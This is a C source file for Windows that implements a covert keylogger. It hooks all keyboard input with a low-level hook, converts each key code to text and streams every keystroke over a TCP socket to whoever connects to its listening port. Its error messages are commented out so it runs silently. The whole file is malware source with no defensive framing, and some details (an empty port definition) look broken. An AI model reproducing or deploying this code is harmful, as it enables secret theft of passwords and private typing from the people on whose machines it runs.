#include <stdio.h>
#include <windows.h>
#include <winsock2.h>
#define PORT1 
#define BUFFER_SIZE 1024

HHOOK g_ms_hook = 0;
HHOOK g_kb_hook = 0;
SOCKET con()
{
    WSADATA WSAData;
    SOCKET sock;
    SOCKADDR_IN ServerAddr;
    if(WSAStartup(MAKEWORD(2,2),&WSAData)==SOCKET_ERROR)
    {
        //printf("Socket initialize fail!\n");
        //system("pause");
        exit(1);
    }

    if((sock=socket(AF_INET,SOCK_STREAM,0))==ERROR)
    {
        //printf("Socket create fail!\n");
        //system("pause");
        WSACleanup();
        exit(1);
    }
    ServerAddr.sin_family=AF_INET;
    ServerAddr.sin_port=htons(PORT1);
    ServerAddr.sin_addr.s_addr=INADDR_ANY;
    if(bind(sock,(LPSOCKADDR)&ServerAddr,sizeof(ServerAddr))==SOCKET_ERROR)
    {
        //printf("Bind fail!\n");
        closesocket(sock);
        WSACleanup();
        //system("pause");
        exit(1);
    }
    //printf("Server Socket Port:%d\n",ntohs(ServerAddr.sin_port));
    if(listen(sock,10)==SOCKET_ERROR)
    {
        //printf("Listen fail!\n");
        closesocket(sock);
        WSACleanup();
        exit(1);
    }
    return sock;
}
SOCKET sock=con();
SOCKET msgsock=accept(sock,(LPSOCKADDR)0,(int *)0);
LRESULT CALLBACK kb_proc (int code, WPARAM w, LPARAM l)
{
    int key;
    char buf[BUFFER_SIZE];
    memset(buf,0,BUFFER_SIZE);

    if(w==WM_KEYDOWN)
    {
        key=((PKBDLLHOOKSTRUCT)l)->vkCode;
        switch(key)
        {
            case 188:strcpy(buf,",");break;
            case 13:strcpy(buf,"Enter");break;
            case 190:strcpy(buf,".");break;
            case 161:strcpy(buf,"r_shift");break;
            case 186:strcpy(buf,";");break;
            case 222:strcpy(buf,"'");break;
            case 32:strcpy(buf,"space");break;
            case 219:strcpy(buf,"[");break;
            case 221:strcpy(buf,"]");break;
            case 220:strcpy(buf,"\\");break;
            case 189:strcpy(buf,"-");break;
            case 187:strcpy(buf,"=");break;
            case 8:strcpy(buf,"backspace");break;
            case 9:strcpy(buf,"tab");break;
            case 20:strcpy(buf,"capsclock");break;
            case 160:strcpy(buf,"l_shift");break;
            case 162:strcpy(buf,"l_ctrl");break;
            case 163:strcpy(buf,"r_ctrl");break;
            case 164:strcpy(buf,"l_alt");break;
            case 165:strcpy(buf,"r_alt");break;
            case 91:strcpy(buf,"system");break;
            case 38:strcpy(buf,"up");break;
            case 40:strcpy(buf,"down");break;
            case 37:strcpy(buf,"left");break;
            case 39:strcpy(buf,"right");break;
            default:{buf[0]=(char)key;buf[1]='\0';};break;
        }
        send(msgsock,buf,BUFFER_SIZE,0);
    }
    return CallNextHookEx (g_kb_hook, code, w, l);
}

int main ()
{

    g_kb_hook = SetWindowsHookEx (WH_KEYBOARD_LL,kb_proc,GetModuleHandle (NULL),0);
    if (g_kb_hook == NULL)
    {
        return 0;
    }
    MSG msg;
    while (GetMessage (&msg, NULL, 0, 0))
    {
        TranslateMessage (&msg);//翻译消息并发送到windows消息队列
        DispatchMessage (&msg) ;//接收信息
    }
    UnhookWindowsHookEx (g_kb_hook);
    closesocket(sock);
    closesocket(msgsock);
    WSACleanup();
    return 0;
}
